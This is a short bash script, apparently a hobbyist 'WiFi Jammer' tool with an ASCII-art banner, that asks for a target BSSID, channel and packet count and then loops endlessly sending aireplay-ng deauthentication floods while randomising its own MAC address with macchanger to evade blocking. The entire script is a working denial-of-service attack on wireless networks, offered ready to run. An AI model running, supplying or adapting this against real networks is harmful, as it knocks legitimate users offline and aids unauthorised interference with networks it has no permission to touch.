#!/bin/bash

cat << "EOF"
 █     █░ ██▓  █████▒██▓    ▄▄▄██▀▀▀▄▄▄       ███▄ ▄███▓ ███▄ ▄███▓▓█████  ██▀███  
▓█░ █ ░█░▓██▒▓██   ▒▓██▒      ▒██  ▒████▄    ▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒
▒█░ █ ░█ ▒██▒▒████ ░▒██▒      ░██  ▒██  ▀█▄  ▓██    ▓██░▓██    ▓██░▒███   ▓██ ░▄█ ▒
░█░ █ ░█ ░██░░▓█▒  ░░██░   ▓██▄██▓ ░██▄▄▄▄██ ▒██    ▒██ ▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄  
░░██▒██▓ ░██░░▒█░   ░██░    ▓███▒   ▓█   ▓██▒▒██▒   ░██▒▒██▒   ░██▒░▒████▒░██▓ ▒██▒
░ ▓░▒ ▒  ░▓   ▒ ░   ░▓      ▒▓▒▒░   ▒▒   ▓▒█░░ ▒░   ░  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
  ▒ ░ ░   ▒ ░ ░      ▒ ░    ▒ ░▒░    ▒   ▒▒ ░░  ░      ░░  ░      ░ ░ ░  ░  ░▒ ░ ▒░
  ░   ░   ▒ ░ ░ ░    ▒ ░    ░ ░ ░    ░   ▒   ░      ░   ░      ░      ░     ░░   ░ 
    ░     ░          ░      ░   ░        ░  ░       ░          ░      ░  ░   ░     
                        Author: Kamalesh D                                                                                   
EOF

read -p "Enter the number of deauthentication packets (e.g., 5): " num_packets
if ! [[ "$num_packets" =~ ^[0-9]+$ ]]; then
    echo "Error: Please enter a valid numeric value for the packet count."
    exit 1
fi

read -p "Enter the BSSID you want to target (e.g., 90:F653:BB:18): " bssid
if ! [[ "$bssid" =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
    echo "Error: Please enter a valid BSSID in the format XX:XX:XX:XX:XX:XX."
    exit 1
fi

read -p "Enter the channel number of the WiFi network: " channel
if ! [[ "$channel" =~ ^[0-9]+$ ]]; then
    echo "Error: Please enter a valid numeric value for the channel."
    exit 1
fi

echo "Starting WiFi deauthentication attack on Channel $channel..."
echo "Press Ctrl+C to stop."

while true 
do 
        iwconfig wlan0 channel "$channel"
        aireplay-ng -0 "$num_packets" -a "$bssid" wlan0
        ifconfig wlan0 down
        macchanger -r wlan0 | grep "New Mac Address Updated"
        iwconfig wlan0 mode monitor
        ifconfig wlan0 up
        iwconfig wlan0 | grep Mode
        sleep 3
        echo "Waiting!!!!"
done
